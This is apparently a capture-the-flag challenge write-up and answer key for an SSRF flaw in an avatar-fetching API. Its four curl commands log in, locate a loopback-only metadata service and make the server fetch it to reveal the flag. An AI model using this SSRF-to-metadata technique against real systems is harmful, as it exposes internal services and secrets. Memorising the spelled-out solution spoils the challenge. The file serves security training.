# api/ssrf-internal — SsrfInternal (location-locked, high)

**Avatario** profile avatars. `POST /api/v1/profile/avatar {"url":…}` makes the **server** fetch any http/https URL you choose (no host allowlist — the SSRF flaw) and stores the body as your "avatar preview"; `GET /api/v1/profile/avatar` returns the stored preview. An instance-metadata service listens on loopback **inside the container only** (`127.0.0.1:8082`) — the edge sidecar forwards nothing but `8119 → app:8080`, so no client can connect directly. Its `/latest/meta-data/` document carries the flag.

Why exploitable: the avatar fetcher runs inside the trust boundary, so any URL it fetches is fetched *from* the internal network position — including loopback-only services no external routing reaches.

## Intended path
1. `curl -s -c jar -X POST -d 'username=0xnhsec&password=vlh-tester-01' http://victim.target.lab:8119/login`
2. Recon: `curl -s http://victim.target.lab:8119/api/v1/status` → internal endpoint `http://127.0.0.1:8082/latest/meta-data/` (loopback only).
3. SSRF: `curl -s -b jar -X POST -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:8082/latest/meta-data/"}' http://victim.target.lab:8119/api/v1/profile/avatar`
4. Read the stored preview: `curl -s -b jar http://victim.target.lab:8119/api/v1/profile/avatar` → `preview.maintenance_token` is the flag.

**Flag:** `DSLTV{API-SsrfInternal-<9 digits>}` (location-locked: only the in-container fetch can reach it). `file://` and other schemes are rejected — http/https only.
